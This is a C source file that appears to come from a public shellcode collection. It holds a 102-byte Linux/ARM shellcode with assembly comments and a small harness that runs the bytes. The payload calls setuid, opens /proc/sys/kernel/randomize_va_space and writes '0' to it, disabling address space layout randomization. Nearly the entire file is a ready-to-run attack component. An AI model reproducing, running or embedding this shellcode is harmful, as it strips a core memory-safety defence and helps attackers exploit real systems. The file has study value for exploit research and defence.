/*
Title:  Linux/ARM - Disable ASLR Security - 102 bytes
Date:   2010-06-20
Tested: Linux ARM9 2.6.28-6-versatile

Author: Jonathan Salwan
Web:    http://shell-storm.org | http://twitter.com/jonathansalwan

! Database of shellcodes http://www.shell-storm.org/shellcode/


Description:
============
 Address space layout randomization (ASLR) is a computer security technique
 which involves randomly arranging the positions of key data areas, usually
 including the base  of the executable and position of libraries, heap, and
 stack, in a process's address space.

 This shellcode disables the ASLR on linux/ARM

*/

#include <stdio.h>

char *SC = "\x01\x30\x8f\xe2"  // add    r3, pc, #1
           "\x13\xff\x2f\xe1"  // bx     r3
           "\x24\x1b"          // subs   r4, r4, r4
           "\x20\x1c"          // adds   r0, r4, #0
           "\x17\x27"          // movs   r7, #23
           "\x01\xdf"          // svc    1
           "\x78\x46"          // mov    r0, pc
           "\x2e\x30"          // adds   r0, #46
           "\xc8\x21"          // movs   r1, #200
           "\xc8\x31"          // adds   r1, #200
           "\xc8\x31"          // adds   r1, #200
           "\xc8\x31"          // adds   r1, #200
           "\xc8\x31"          // adds   r1, #200
           "\x59\x31"          // adds   r1, #89
           "\xc8\x22"          // movs   r2, #200
           "\xc8\x32"          // adds   r2, #200
           "\x14\x32"          // adds   r2, #20
           "\x05\x27"          // movs   r7, #5
           "\x01\xdf"          // svc    1
           "\x03\x20"          // movs   r0, #3
           "\x79\x46"          // mov    r1, pc
           "\x0e\x31"          // adds   r1, #14
           "\x02\x22"          // movs   r2, #2
           "\x04\x27"          // movs   r7, #4
           "\x01\xdf"          // svc    1
           "\x92\x1a"          // subs   r2, r2, r2
           "\x10\x1c"          // adds   r0, r2, #0
           "\x01\x27"          // movs   r7, #1
           "\x01\xdf"          // svc    1

           "\x30\x0a"          // ^
           "\x2d\x2d"          // |
           "\x2f\x2f"          // |
           "\x70\x72"          // |
           "\x6f\x63"          // |
           "\x2f\x73"          // |
           "\x79\x73"          // |
           "\x2f\x6b"          // |
           "\x65\x72"          // |
           "\x6e\x65"          // |  [ strings ]
           "\x6c\x2f"          // |
           "\x72\x61"          // |
           "\x6e\x64"          // |
           "\x6f\x6d"          // |
           "\x69\x7a"          // |
           "\x65\x5f"          // |
           "\x76\x61"          // |
           "\x5f\x73"          // |
           "\x70\x61"          // |
           "\x63\x65";         // v


int main(void)
{
        fprintf(stdout,"Length: %d\n",strlen(SC));
        (*(void(*)()) SC)();
return 0;
}